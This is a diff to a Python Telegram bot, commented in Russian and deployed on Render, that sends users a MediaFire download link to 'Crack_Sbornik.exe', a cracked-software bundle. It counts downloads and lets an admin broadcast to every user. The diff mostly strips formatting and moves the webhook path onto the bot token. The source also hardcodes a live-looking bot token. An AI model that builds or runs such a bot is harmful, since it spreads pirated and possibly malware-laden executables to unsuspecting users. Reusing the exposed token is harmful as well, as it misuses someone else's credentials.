@@ -1,16 +1,16 @@
 import os
 import time
-import threading
 from flask import Flask, request
 import telebot
 from telebot import types
 
-TOKEN = "8294974465:AAFfeR0krjHmDUwdQm7rO5N6VfnV8ZvFrOI"  # ЗАМЕНИТЕ НА СВОЙ ТОКЕН
+# ⚠️ ВСТАВЬ НОВЫЙ ТОКЕН (старый отзови у @BotFather) ⚠️
+TOKEN = "8294974465:AAFfeR0krjHmDUwdQm7rO5N6VfnV8ZvFrOI"
 SOFT_LINK = "https://www.mediafire.com/file/aulm7t7mu6388sc/Crack_Sbornik.exe/file"
 IMAGE_URL = "https://i.ibb.co/KpKqsd8x/gg.png"
 
-# ВСТАВЬТЕ СВОЙ TELEGRAM ID
-ADMIN_ID = 7859226148  # ЗАМЕНИТЕ НА СВОЙ ID
+# ТВОЙ TELEGRAM ID
+ADMIN_ID = 7859226148
 
 bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
@@ -68,9 +68,9 @@ def admin_panel(message):
     btn5 = types.InlineKeyboardButton("🖼 Сменить картинку", callback_data="admin_change_image")
     keyboard.add(btn1, btn2, btn3, btn4, btn5)
     
-    bot.send_message(message.chat.id, "🔧 **Админ-панель**", parse_mode="Markdown", reply_markup=keyboard)
+    bot.send_message(message.chat.id, "🔧 Админ-панель", reply_markup=keyboard)
 
-# Обработчик для обычных кнопок (НЕ админских)
+# Обработчик для обычных кнопок
 @bot.callback_query_handler(func=lambda call: call.data in ["download", "more", "share"])
 def user_callback(call):
     global download_count
@@ -88,7 +88,7 @@ def user_callback(call):
     if call.data == "download":
         download_count += 1
         bot.answer_callback_query(call.id, "✅ Ссылка отправлена!")
-        bot.send_message(call.message.chat.id, f"🔗 **Ссылка для скачивания:**\n{SOFT_LINK}", parse_mode="Markdown")
+        bot.send_message(call.message.chat.id, f"🔗 Ссылка для скачивания:\n{SOFT_LINK}")
     
     elif call.data == "more":
         bot.answer_callback_query(call.id, "📸 Картинка отправлена!")
@@ -96,7 +96,7 @@ def user_callback(call):
     
     elif call.data == "share":
         bot.answer_callback_query(call.id)
-        bot.send_message(call.message.chat.id, f"👥 **Поделиться ботом:**\n\nhttps://t.me/{bot.get_me().username}\n\n📎 Отправь эту ссылку друзьям!", parse_mode="Markdown")
+        bot.send_message(call.message.chat.id, f"👥 Поделиться ботом:\n\nhttps://t.me/{bot.get_me().username}")
 
 # Обработчик для админских кнопок
 @bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
@@ -104,64 +104,60 @@ def admin_callback(call):
     global download_count, SOFT_LINK, IMAGE_URL
     
     user_id = call.from_user.id
-    users.add(user_id)
     
     if not is_admin(user_id):
         bot.answer_callback_query(call.id, "❌ Нет доступа!", show_alert=True)
         return
     
+    bot.answer_callback_query(call.id)
+    
     if call.data == "admin_stats":
-        bot.answer_callback_query(call.id)
-        bot.send_message(call.message.chat.id, f"📊 **Статистика:**\n\n📥 Скачиваний: {download_count}\n👥 Пользователей: {len(users)}", parse_mode="Markdown")
+        bot.send_message(call.message.chat.id, f"📊 Статистика:\n\n📥 Скачиваний: {download_count}\n👥 Пользователей: {len(users)}")
     
     elif call.data == "admin_users":
-        bot.answer_callback_query(call.id)
-        bot.send_message(call.message.chat.id, f"👥 **Всего пользователей:** {len(users)}")
+        bot.send_message(call.message.chat.id, f"👥 Всего пользователей: {len(users)}")
     
     elif call.data == "admin_change_link":
-        bot.answer_callback_query(call.id)
-        msg = bot.send_message(call.message.chat.id, "📝 **Отправьте новую ссылку для скачивания:**", parse_mode="Markdown")
+        msg = bot.send_message(call.message.chat.id, "📝 Отправьте новую ссылку:")
         bot.register_next_step_handler(msg, change_link)
     
     elif call.data == "admin_change_image":
-        bot.answer_callback_query(call.id)
-        msg = bot.send_message(call.message.chat.id, "🖼 **Отправьте новую ссылку на картинку:**", parse_mode="Markdown")
+        msg = bot.send_message(call.message.chat.id, "🖼 Отправьте новую ссылку на картинку:")
         bot.register_next_step_handler(msg, change_image)
     
     elif call.data == "admin_broadcast":
-        bot.answer_callback_query(call.id)
-        msg = bot.send_message(call.message.chat.id, "📢 **Введите текст для рассылки:**", parse_mode="Markdown")
+        msg = bot.send_message(call.message.chat.id, "📢 Введите текст для рассылки:")
         bot.register_next_step_handler(msg, broadcast)
 
 def change_link(message):
     global SOFT_LINK
     SOFT_LINK = message.text.strip()
-    bot.send_message(message.chat.id, f"✅ Ссылка успешно изменена!\n\n🔗 Новая ссылка:\n{SOFT_LINK}")
+    bot.send_message(message.chat.id, f"✅ Ссылка изменена!\n\n{SOFT_LINK}")
 
 def change_image(message):
     global IMAGE_URL
     IMAGE_URL = message.text.strip()
-    bot.send_message(message.chat.id, f"✅ Картинка успешно изменена!\n\n🖼 Новая ссылка:\n{IMAGE_URL}")
+    bot.send_message(message.chat.id, f"✅ Картинка изменена!\n\n{IMAGE_URL}")
 
 def broadcast(message):
     text = message.text.strip()
     success = 0
     fail = 0
     
-    bot.send_message(message.chat.id, "📢 **Начинаю рассылку...**\n\n⏳ Это может занять некоторое время", parse_mode="Markdown")
+    bot.send_message(message.chat.id, "📢 Начинаю рассылку...")
     
     for user_id in users:
         try:
-            bot.send_message(user_id, f"📢 **Новость от админа:**\n\n{text}", parse_mode="Markdown")
+            bot.send_message(user_id, f"📢 Новость:\n\n{text}")
             success += 1
         except:
             fail += 1
         time.sleep(0.05)
     
-    bot.send_message(message.chat.id, f"✅ **Рассылка завершена!**\n\n📨 Доставлено: {success}\n❌ Ошибок: {fail}")
+    bot.send_message(message.chat.id, f"✅ Рассылка завершена!\n\n📨 Доставлено: {success}\n❌ Ошибок: {fail}")
 
 # Webhook для Render
-@app.route('/webhook', methods=['POST'])
+@app.route(f'/{TOKEN}', methods=['POST'])
 def webhook():
     if request.headers.get('content-type') == 'application/json':
         json_string = request.get_data().decode('utf-8')
@@ -174,17 +170,13 @@ def webhook():
 def index():
     return "Bot is running!"
 
-@app.route('/healthz')
-def health():
-    return "OK"
-
 if __name__ == "__main__":
     # Удаляем старый webhook
     bot.remove_webhook()
     time.sleep(1)
     
     # Устанавливаем новый webhook
-    webhook_url = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'bot-tg-1-tw5w.onrender.com')}/webhook"
+    webhook_url = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'bot-tg-1-tw5w.onrender.com')}/{TOKEN}"
     bot.set_webhook(url=webhook_url)
     print(f"✅ Webhook установлен: {webhook_url}")
     
